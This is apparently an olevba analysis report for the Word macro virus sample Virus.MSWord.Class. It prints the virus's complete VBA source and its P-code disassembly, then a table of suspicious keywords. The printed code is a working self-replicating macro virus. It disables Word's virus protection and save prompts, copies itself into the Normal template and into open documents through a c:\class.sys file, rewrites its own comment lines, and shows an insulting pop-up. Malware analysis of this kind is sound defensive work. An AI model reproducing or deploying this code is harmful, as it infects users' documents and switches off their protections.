olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.et
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.et - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
On Error GoTo out
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
Options.VirusProtection = False
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
Options.SaveNormalPrompt = False
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
Options.ConfirmConversions = False
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If nt > 70 And ad > 0 Then GoTo out
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If nt < 70 Then
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End If
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
host.codemodule.AddFromFile ("c:\class.sys")
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
With host.codemodule
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    For x = 1 To 4
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    .deletelines 1
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    Next x
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End With
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If nt < 80 Then
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    With host.codemodule
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    .replaceline 1, "Sub AutoClose()"
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    .replaceline 71, "Sub ToolsMacro()"
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    End With
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End If
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
With host.codemodule
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    For x = 2 To 72 Step 2
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
    Next x
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End With
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
out:
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End Sub
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
Sub ToolsMacro()
'Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.et
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7555 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #28:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #30:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #40:
' 	EndWith 
' Line #41:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #42:
' 	Ld nt 
' 	LitDI2 0x0050 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #48:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #50:
' 	EndWith 
' Line #51:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #54:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #55:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #57:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #58:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #62:
' 	EndWith 
' Line #63:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #64:
' 	Label out 
' Line #65:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #66:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #67:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #68:
' 	EndSub 
' Line #69:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x005A "Total Konfuzion22.02.01 10:50:56HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWdok1Karl Klammer"
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

